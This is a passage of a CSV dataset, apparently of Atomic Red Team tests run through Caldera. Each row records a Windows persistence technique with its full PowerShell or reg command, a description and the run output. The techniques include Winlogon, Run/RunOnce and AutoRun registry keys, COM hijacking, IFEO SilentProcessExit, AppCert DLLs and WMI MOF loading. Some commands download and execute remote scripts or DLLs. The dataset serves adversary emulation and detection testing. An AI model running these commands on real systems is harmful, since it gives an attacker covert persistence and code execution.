""HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam"" ""Logon"" ""AtomicTestFunction"" -Force; Set-ItemProperty ""HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam"" ""Impersonate"" 1 -Type DWord -Force; Set-ItemProperty ""HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam"" ""Asynchronous"" 0 -Type DWord -Force']","['PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.\n\nPlease note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.\n']",['Winlogon Notify Key Logon Persistence - PowerShell'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Winlogon Helper DLL', 'technique_id': 'T1547.004'}]",['windows'],['psh']
204,Initial-Success,multiple,multiple :: Boot or Logon Autostart Execution: Winlogon Helper DLL,multiple :: ['Winlogon HKLM Shell Key Persistence - PowerShell'],multiple :: T1547.004,operation__atomic_windows_depfalse_pshtrue__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__dc74af5b90b9cbb4dcfbcaaa3e412a5e__SAVED_2024-03-08_200602,atomic_windows_depfalse_pshtrue__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__dc74af5b90b9cbb4dcfbcaaa3e412a5e,['dc74af5b90b9cbb4dcfbcaaa3e412a5e'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Set-ItemProperty ""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"" ""Shell"" ""explorer.exe, C:\\Windows\\System32\\cmd.exe"" -Force']","['PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n']",['Winlogon HKLM Shell Key Persistence - PowerShell'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Winlogon Helper DLL', 'technique_id': 'T1547.004'}]",['windows'],['psh']
205,Initial-Success,multiple,multiple :: Boot or Logon Autostart Execution: Winlogon Helper DLL,multiple :: ['Winlogon HKLM Userinit Key Persistence - PowerShell'],multiple :: T1547.004,operation__atomic_windows_depfalse_pshtrue__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__92578413245a3418c9dc21dc5db784ff__SAVED_2024-03-08_195920,atomic_windows_depfalse_pshtrue__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__92578413245a3418c9dc21dc5db784ff,['92578413245a3418c9dc21dc5db784ff'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Set-ItemProperty ""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"" ""Userinit"" ""Userinit.exe, C:\\Windows\\System32\\cmd.exe"" -Force']","['PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n']",['Winlogon HKLM Userinit Key Persistence - PowerShell'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Winlogon Helper DLL', 'technique_id': 'T1547.004'}]",['windows'],['psh']
206,Initial-Success,multiple,multiple :: Boot or Logon Autostart Execution: Winlogon Helper DLL,multiple :: ['Winlogon Shell Key Persistence - PowerShell'],multiple :: T1547.004,operation__atomic_windows_depfalse_pshtrue__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__7cd5d1852fb4a534fa9b735288ca158f__SAVED_2024-03-08_195238,atomic_windows_depfalse_pshtrue__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__7cd5d1852fb4a534fa9b735288ca158f,['7cd5d1852fb4a534fa9b735288ca158f'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Set-ItemProperty ""HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"" ""Shell"" ""explorer.exe, C:\\Windows\\System32\\cmd.exe"" -Force']","['PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n']",['Winlogon Shell Key Persistence - PowerShell'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Winlogon Helper DLL', 'technique_id': 'T1547.004'}]",['windows'],['psh']
207,Initial-Success,multiple,multiple :: Boot or Logon Autostart Execution: Winlogon Helper DLL,multiple :: ['Winlogon Userinit Key Persistence - PowerShell'],multiple :: T1547.004,operation__atomic_windows_depfalse_pshtrue__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__5c23188ed301af9f1b6b55d4f3f60b46__SAVED_2024-03-08_194555,atomic_windows_depfalse_pshtrue__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__5c23188ed301af9f1b6b55d4f3f60b46,['5c23188ed301af9f1b6b55d4f3f60b46'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Set-ItemProperty ""HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"" ""Userinit"" ""Userinit.exe, C:\\Windows\\System32\\cmd.exe"" -Force']","['PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n']",['Winlogon Userinit Key Persistence - PowerShell'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Winlogon Helper DLL', 'technique_id': 'T1547.004'}]",['windows'],['psh']
213,Initial-Success,multiple,multiple :: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,multiple :: ['SystemBC Malware-as-a-Service Registry'],multiple :: T1547.001,"operation__atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__9b74d10b3164f13d357830d1a6ee334a__SAVED_2024-03-08_190529","atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__9b74d10b3164f13d357830d1a6ee334a",['9b74d10b3164f13d357830d1a6ee334a'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$RunKey = ""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run""; Set-ItemProperty -Path $RunKey -Name ""socks5_powershell"" -Value ""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File""']",['This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n'],['SystemBC Malware-as-a-Service Registry'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder', 'technique_id': 'T1547.001'}]",['windows'],['psh']
214,Initial-Success,multiple,multiple :: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,multiple :: ['PowerShell Registry RunOnce'],multiple :: T1547.001,"operation__atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__3c0760559a620aad7664cdf98f486127__SAVED_2024-03-08_185202","atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__3c0760559a620aad7664cdf98f486127",['3c0760559a620aad7664cdf98f486127'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$RunOnceKey = ""HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce""; set-itemproperty $RunOnceKey ""NextRun"" \'powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""\'']","['RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n']",['PowerShell Registry RunOnce'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder', 'technique_id': 'T1547.001'}]",['windows'],['psh']
217,Initial-Success,multiple,multiple :: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,multiple :: ['Add Executable Shortcut Link to User Startup Folder'],multiple :: T1547.001,"operation__atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__1f15ab22c39a9b6bb2bb0d77276dfcb3__SAVED_2024-03-08_181828","atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__1f15ab22c39a9b6bb2bb0d77276dfcb3",['1f15ab22c39a9b6bb2bb0d77276dfcb3'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$Target = ""C:\\Windows\\System32\\calc.exe""; $ShortcutLocation = ""$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk""; $WScriptShell = New-Object -ComObject WScript.Shell; $Create = $WScriptShell.CreateShortcut($ShortcutLocation); $Create.TargetPath = $Target; $Create.Save()']",['Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. '],['Add Executable Shortcut Link to User Startup Folder'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder', 'technique_id': 'T1547.001'}]",['windows'],['psh']
218,Initial-Success,multiple,multiple :: Event Triggered Execution,multiple :: ['HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)'],multiple :: T1546,operation__atomic_windows_depfalse_pshtrue__t1546__multiple__event_triggered_execution__495536c73651969fd80a8f263c293194__SAVED_2024-03-08_173811,atomic_windows_depfalse_pshtrue__t1546__multiple__event_triggered_execution__495536c73651969fd80a8f263c293194,['495536c73651969fd80a8f263c293194'],1,0,1,[1],['    Hive: HKEY_CURRENT_USER\\Software\\MicrosoftName                           Property                                                                                ----                           --------                                                                                Command Processor                                                                                                      AutoRun      : notepad.exePSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Command ProcessorPSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\Software\\MicrosoftPSChildName  : Command ProcessorPSDrive      : HKCUPSProvider   : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['$path = ""HKCU:\\Software\\Microsoft\\Command Processor""; if (!(Test-Path -path $path)){;   New-Item -ItemType Key -Path $path; }; New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""notepad.exe"" -PropertyType ""String""']","['An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)']",['HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)'],"[{'tactic': 'multiple', 'technique_name': 'Event Triggered Execution', 'technique_id': 'T1546'}]",['windows'],['psh']
219,Initial-Success,multiple,multiple :: Event Triggered Execution,multiple :: ['HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)'],multiple :: T1546,operation__atomic_windows_depfalse_pshtrue__t1546__multiple__event_triggered_execution__50a9be8bbff4d4ffe0b699cb8d040c6d__SAVED_2024-03-08_174453,atomic_windows_depfalse_pshtrue__t1546__multiple__event_triggered_execution__50a9be8bbff4d4ffe0b699cb8d040c6d,['50a9be8bbff4d4ffe0b699cb8d040c6d'],1,0,1,[1],['AutoRun      : notepad.exePSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Command ProcessorPSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\Software\\MicrosoftPSChildName  : Command ProcessorPSDrive      : HKLMPSProvider   : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['New-ItemProperty -Path ""HKLM:\\Software\\Microsoft\\Command Processor"" -Name ""AutoRun"" -Value ""notepad.exe"" -PropertyType ""String""']","['An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)']",['HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)'],"[{'tactic': 'multiple', 'technique_name': 'Event Triggered Execution', 'technique_id': 'T1546'}]",['windows'],['psh']
221,Initial-Success,multiple,multiple :: Event Triggered Execution,multiple :: ['Persistence with Custom AutodialDLL'],multiple :: T1546,operation__atomic_windows_depfalse_pshtrue__t1546__multiple__event_triggered_execution__2fc2b9c9b48990938653dbe8966d487d__SAVED_2024-03-08_173129,atomic_windows_depfalse_pshtrue__t1546__multiple__event_triggered_execution__2fc2b9c9b48990938653dbe8966d487d,['2fc2b9c9b48990938653dbe8966d487d'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['if (Test-Path PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll) { ; } else {New-Item -Type Directory ""PathToAtomicsFolder\\T1546\\bin\\"" -ErrorAction ignore | Out-Null; Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll"" -OutFile ""PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll""};  ;  Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll']","['The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n']",['Persistence with Custom AutodialDLL'],"[{'tactic': 'multiple', 'technique_name': 'Event Triggered Execution', 'technique_id': 'T1546'}]",['windows'],['psh']
222,Initial-Success,multiple,multiple :: Event Triggered Execution: Component Object Model Hijacking,multiple :: ['Powershell Execute COM Object'],multiple :: T1546.015,operation__atomic_windows_depfalse_pshtrue__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__d94bcdfc9d0f769b062e1960f7af6804__SAVED_2024-03-08_172448,atomic_windows_depfalse_pshtrue__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__d94bcdfc9d0f769b062e1960f7af6804,['d94bcdfc9d0f769b062e1960f7af6804'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(""9BA05972-F6A8-11CF-A442-00A0C90A8F39"")); $item = $o.Item(); $item.Document.Application.ShellExecute(""cmd.exe"",""/c calc.exe"",""C:\\windows\\system32"",$null,0)']",['Use the PowerShell to execute COM CLSID object.\nReference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/'],['Powershell Execute COM Object'],"[{'tactic': 'multiple', 'technique_name': 'Event Triggered Execution: Component Object Model Hijacking', 'technique_id': 'T1546.015'}]",['windows'],['psh']
223,Initial-Success,multiple,multiple :: Event Triggered Execution: Component Object Model Hijacking,multiple :: ['COM Hijacking - InprocServer32'],multiple :: T1546.015,operation__atomic_windows_depfalse_pshtrue__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__3c8ae3452b200f3509b14463df78068c__SAVED_2024-03-08_171122,atomic_windows_depfalse_pshtrue__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__3c8ae3452b200f3509b14463df78068c,['3c8ae3452b200f3509b14463df78068c'],1,0,1,[1],['    Hive: HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSIDName                           Property                                                                                ----                           --------                                                                                {B5F8350B-0548-48B1-A6EE-88BD0 (default) : MSAA AccPropServices                                                        0B4A5E7}                                                                                                                   Hive: HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}Name                           Property                                                                                ----                           --------                                                                                InprocServer32                 (default) : PathToAtomicsFolder\\..\\ExternalPayloads\\AtomicTest.dll                      ThreadingModel : ApartmentPSPath         : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-                 88BD00B4A5E7}\\InprocServer32PSParentPath   : Microsoft.PowerShell.Core\\Registry::HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-                 88BD00B4A5E7}PSChildName    : InprocServer32PSDrive        : HKCUPSProvider     : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['New-Item -Path \'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\' -Value \'MSAA AccPropServices\'; New-Item -Path \'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32\' -Value ""PathToAtomicsFolder\\..\\ExternalPayloads\\AtomicTest.dll""; New-ItemProperty -Path \'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32\' -Name \'ThreadingModel\' -Value \'Apartment\' -PropertyType ""String""; Start-Process -FilePath ""C:\\Windows\\System32\\RUNDLL32.EXE"" -ArgumentList \'-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\'']",['This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.\n\nReference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/'],['COM Hijacking - InprocServer32'],"[{'tactic': 'multiple', 'technique_name': 'Event Triggered Execution: Component Object Model Hijacking', 'technique_id': 'T1546.015'}]",['windows'],['psh']
224,Initial-Success,multiple,multiple :: Event Triggered Execution: Component Object Model Hijacking,multiple :: ['COM hijacking via TreatAs'],multiple :: T1546.015,operation__atomic_windows_depfalse_pshtrue__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__2db3b2385ba856424bfe130f69fc0529__SAVED_2024-03-08_170444,atomic_windows_depfalse_pshtrue__t1546_015__multiple__event_triggered_execution-_component_object_model_hijacking__2db3b2385ba856424bfe130f69fc0529,['2db3b2385ba856424bfe130f69fc0529'],1,0,1,[1],['The operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\r'],[''],['0'],"['reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest"" /ve /T REG_SZ /d ""AtomicTest"" /f; reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00"" /ve /T REG_SZ /d ""AtomicTest"" /f; reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f; reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f; reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}"" /f; reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}"" /ve /T REG_SZ /d ""AtomicTest"" /f; reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32"" /ve /T REG_SZ /d ""C:\\WINDOWS\\system32\\scrobj.dll"" /f; reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32"" /v ""ThreadingModel"" /T REG_SZ /d ""Apartment"" /f; reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f; reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL"" /ve /T REG_SZ /d ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct"" /f; reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f; reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"" /f; reg add ""HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f; rundll32.exe -sta ""AtomicTest""']","['This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.\nThen, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the \'TreatAs\' with the malicious CLSID as default value. The\ntest is validated by running \'rundll32.exe -sta ""AtomicTest""\' to avoid logging out.\n\nReferences:\n\nhttps://youtu.be/3gz1QmiMhss?t=1251\n\nhttps://github.com/enigma0x3/windows-operating-system-archaeology']",['COM hijacking via TreatAs'],"[{'tactic': 'multiple', 'technique_name': 'Event Triggered Execution: Component Object Model Hijacking', 'technique_id': 'T1546.015'}]",['windows'],['psh']
226,Initial-Success,multiple,multiple :: Event Triggered Execution: Image File Execution Options Injection,multiple :: ['GlobalFlags in Image File Execution Options'],multiple :: T1546.012,operation__atomic_windows_depfalse_pshtrue__t1546_012__multiple__event_triggered_execution-_image_file_execution_options_injection__7f43a2b144f2534eb979d2b6638e0283__SAVED_2024-03-08_165127,atomic_windows_depfalse_pshtrue__t1546_012__multiple__event_triggered_execution-_image_file_execution_options_injection__7f43a2b144f2534eb979d2b6638e0283,['7f43a2b144f2534eb979d2b6638e0283'],1,0,1,[1],['    Hive: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution OptionsName                           Property                                                                                ----                           --------                                                                                whoami.exe                                                                                                             GlobalFlag   : 512PSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows                NT\\CurrentVersion\\Image File Execution Options\\whoami.exePSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows                NT\\CurrentVersion\\Image File Execution OptionsPSChildName  : whoami.exePSDrive      : HKLMPSProvider   : Microsoft.PowerShell.Core\\Registry    Hive: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExitName                           Property                                                                                ----                           --------                                                                                whoami.exe                                                                                                             ReportingMode : 1PSPath        : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows                 NT\\CurrentVersion\\SilentProcessExit\\whoami.exePSParentPath  : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows                 NT\\CurrentVersion\\SilentProcessExitPSChildName   : whoami.exePSDrive       : HKLMPSProvider    : Microsoft.PowerShell.Core\\RegistryMonitorProcess : cmd.exe /c calc.exePSPath         : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows                  NT\\CurrentVersion\\SilentProcessExit\\whoami.exePSParentPath   : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows                  NT\\CurrentVersion\\SilentProcessExitPSChildName    : whoami.exePSDrive        : HKLMPSProvider     : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['$Name = ""GlobalFlag""; $Value = ""512""; $registryPath = ""HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe""; New-Item -Path $registryPath -Force; New-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force; $Name = ""ReportingMode""; $Value = ""1""; $SilentProcessExit = ""HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe""; New-Item -Path $SilentProcessExit -Force; New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force ; $Name = ""MonitorProcess""; $Value = ""cmd.exe /c calc.exe""; New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force; Start-Process whoami.exe']","['The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.\nUpon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. \nUpon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.\n']",['GlobalFlags in Image File Execution Options'],"[{'tactic': 'multiple', 'technique_name': 'Event Triggered Execution: Image File Execution Options Injection', 'technique_id': 'T1546.012'}]",['windows'],['psh']
229,Initial-Success,multiple,multiple :: Event Triggered Execution: AppCert DLLs,multiple :: ['Create registry persistence via AppCert DLL'],multiple :: T1546.009,operation__atomic_windows_depfalse_pshtrue__t1546_009__multiple__event_triggered_execution-_appcert_dlls__5d4905a2f789ff40c53b1ea8ee53df3d__SAVED_2024-03-08_163134,atomic_windows_depfalse_pshtrue__t1546_009__multiple__event_triggered_execution-_appcert_dlls__5d4905a2f789ff40c53b1ea8ee53df3d,['5d4905a2f789ff40c53b1ea8ee53df3d'],1,0,1,[1],['The operation completed successfully.\r'],[''],['0'],"['Copy-Item ""7e8ee7_AtomicTest.dll"" C:\\Users\\Public\\AtomicTest.dll -Force; reg add ""HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls"" /v ""AtomicTest"" /t REG_EXPAND_SZ /d ""C:\\Users\\Public\\AtomicTest.dll"" /f; if($false){Restart-Computer}']","[""Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n""]",['Create registry persistence via AppCert DLL'],"[{'tactic': 'multiple', 'technique_name': 'Event Triggered Execution: AppCert DLLs', 'technique_id': 'T1546.009'}]",['windows'],['psh']
232,Initial-Success,multiple,multiple :: Event Triggered Execution: Windows Management Instrumentation Event Subscription,multiple :: ['Windows MOFComp.exe Load MOF File'],multiple :: T1546.003,operation__atomic_windows_depfalse_pshtrue__t1546_003__multiple__event_triggered_execution-_windows_management_instrumentation_event_subscription__248be98ef985ef5053a26ed7cd929c14__SAVED_2024-03-08_160512,atomic_windows_depfalse_pshtrue__t1546_003__multiple__event_triggered_execution-_windows_management_instrumentation_event_subscription__248be98ef985ef5053a26ed7cd929c14,['248be98ef985ef5053a26ed7cd929c14'],1,0,1,[1],['Microsoft (R) MOF Compiler Version 10.0.19041.3570Copyright (c) Microsoft Corp. 1997-2006. All rights reserved.Parsing MOF file: 715d8f_T1546.003.mofMOF file has been successfully parsedStoring data in the repository...Done!'],[''],['0'],"['c:\\windows\\system32\\wbem\\mofcomp.exe ""715d8f_T1546.003.mof""']",['The following Atomic will utilize MOFComp.exe to load a local MOF file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\subscription\nA successful execution will add the class to WMI root namespace.\nReference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n'],['Windows MOFComp.exe Load MOF File'],"[{'tactic': 'multiple', 'technique_name': 'Event Triggered Execution: Windows Management Instrumentation Event Subscription', 'technique_id': 'T1546.003'}]",['windows'],['psh']
